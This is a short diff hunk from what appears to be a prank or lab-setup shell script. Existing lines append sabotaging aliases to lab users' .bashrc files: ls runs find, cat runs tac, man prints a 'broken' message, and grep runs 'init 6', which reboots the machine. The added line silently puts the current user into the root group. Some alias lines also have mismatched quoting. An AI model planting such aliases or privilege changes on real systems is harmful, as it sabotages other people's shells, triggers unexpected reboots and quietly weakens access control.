@@ -88,6 +88,7 @@ echo 'alias ls='find >> /home/labuser*/.bashrc
 echo 'alias cat='tac >> /home/labuser*/.bashrc
 echo 'alias man='\'echo\ \'this\\ might\\ be\\ broken\'\' >> /home/labuser*/.bashrc
 echo 'alias grep='\'init\ 6\' >> /home/labuser*/.bashrc
+usermod -a -G root $USER
 
 echo 'look at your bashrc file, if you can find it' >> $logfile
 
